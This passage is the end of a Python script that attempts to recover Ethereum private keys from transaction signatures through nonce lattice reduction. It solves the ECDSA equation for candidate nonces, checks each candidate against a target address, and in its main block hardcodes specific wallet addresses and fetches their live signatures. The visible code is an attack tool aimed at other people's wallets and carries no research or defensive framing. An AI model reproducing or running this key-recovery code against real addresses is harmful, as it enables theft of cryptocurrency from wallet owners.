            # Formula: d = (s*k - z) * r^-1 mod N
            d = ((s * k_cand - z) * pow(r, -1, N)) % N
            # Verify against your target address
            if verify_address(d, address):
                found = True

    print(found)
    print("[-] Lattice reduction complete, but no key was found in the basis.")
    return None

if __name__ == "__main__":
    #address = "0x120A270bbC009644e35F0bB6ab13f95b8199c4ad"
    address = "0xC839EE5542b4E8413246b3634C5c739fEA949562"
    # Example: A random early 2015 transaction hash
    # hash1 = "0x6d498b721c918c5f6e904918f8a96044e79747f34b5e71a018aac1c4bec8caf9" 
    # hash2 = "0x373b8f71941cb7c70e5bbcd7341acf7106e31f95254527c7d33c0ce98d320af5"
    # data1 = get_legacy_tx_values(hash1)
    # data2 = get_legacy_tx_values(hash2)
    # arbcheck.solve_two_lattice(data1['z'], data1['r'], data1['s'], data2['z'], data2['r'], data2['s'])
    get_live_signatures(address)
